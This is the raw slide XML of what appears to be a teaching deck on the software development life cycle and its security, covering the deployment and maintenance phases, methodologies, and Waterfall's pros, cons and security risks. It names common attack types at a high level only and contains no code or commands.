            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Continued….</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C7B68F8E-2FF5-55AA-FFDC-CE43275C62E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1069075"/>
            <a:ext cx="7704000" cy="3998794"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Deployment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Deliver the software to the end users and make it operational.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prepare deployment plan.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set up production environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Install and configure the software.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Conduct deployment testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Provide user training and support. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attacks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Configuration Tampering: Changing configurations to weaken security postures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malware Injection in Build Process: Embedding malicious payloads during packaging.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Risks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Unsecure deployment channels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use of hardcoded credentials</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20935350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F02ED-6245-A34E-BD5E-5A01FD230B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A5D673-917C-7CE7-3B5B-4F10CC358528}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Continued….</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{774629BD-D97E-C98E-1F0D-7AF438DE2CE0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1069075"/>
            <a:ext cx="7704000" cy="3998794"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Maintenance and Operations Phase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Bug Fixing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Updates and Enhancements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Performance Monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Security Patching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Backup and Recovery Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Attacks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Patch Delay Exploits: Attackers exploit known vulnerabilities that remain unpatched.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Privilege Escalation: Using maintenance tools or scripts to gain unauthorized access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Log Manipulation: Tampering with logs to hide traces of attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>Risks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Insufficient monitoring and logging</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Weak incident response and recovery plans</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Lack of regular security updates</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="856833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04950-F4EF-3323-950A-ACBCB29B10D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Importance of software development life cycle</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE63F0C3-BB9F-E5E5-61E7-DE38D2B6FDCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Structured Approach</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Improved Planning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Quality Assurance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Risk Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Customer Satisfaction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Efficient Resource Use</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Documentation</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1088655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BF8B1-AB12-81BA-C078-1EDDEE7234C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Software development methods</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18ECFBB2-DC4C-E08F-E3EB-BE0FD109A613}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Software development methodologies are frameworks or models that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>guide the software development process and define the roles, responsibilities, activities, and deliverables of the software development team</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. There are lots of different software development methodologies present, all methodologies have different strengths and weaknesses and exist for different reasons. Following are few software development methodologies:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. Waterfall development method </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. Agile development methodology</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. Rapid </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>application development</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1367555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wipe(down)">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="5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8" presetClass="emph" presetSubtype="0" fill="hold" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animRot by="21600000">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="2000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>r</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                    </p:animRot>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="18" presetID="8" presetClass="emph" presetSubtype="0" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animRot by="21600000">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="2000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>r</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                    </p:animRot>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="20" presetID="8" presetClass="emph" presetSubtype="0" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animRot by="21600000">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="2000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>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834B9-66E5-C690-3D6C-7D31E96B5EB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Waterfall development method</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF25D520-6C08-FA34-CEC4-9C9C47AB0567}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="272847" y="1406669"/>
            <a:ext cx="3852000" cy="3388200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>The Waterfall method is a linear and sequential approach where each phase of the software development process is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>completed before the next one begins</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>. It is structured with distinct stages like requirements gathering, design, implementation, testing, and maintenance.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{633C9798-4A61-6D20-0F4F-1D8F77EAF52D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="16704" r="21868"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4161876" y="1406669"/>
            <a:ext cx="4906761" cy="3521785"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40809936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834B9-66E5-C690-3D6C-7D31E96B5EB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Waterfall development method</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF25D520-6C08-FA34-CEC4-9C9C47AB0567}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Pros:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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Clear, structured approach</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Easy to manage due to fixed stages</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Defined milestones and deliverables</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Well-documented process</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Simple to understand and implement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Cons:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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Inflexible to changes</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Late testing phase</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Limited customer feedback during development</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Long delivery times</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Difficult to backtrack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2699923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2E8AA-A7C3-7919-2BB5-8F03A069AAA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Risks in Waterfall Model:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FA04F9B-DE9B-9846-5691-22F88789C298}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Reactive security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, not proactive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Missed opportunities for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>early secure design</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Vulnerabilities found late = more costly to fix</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Design flaws might go undetected until the end</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Security testing is often </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>rushed or skipped</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> due to time pressure at the end</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Limited room for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>iterative threat modeling or security reviews</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
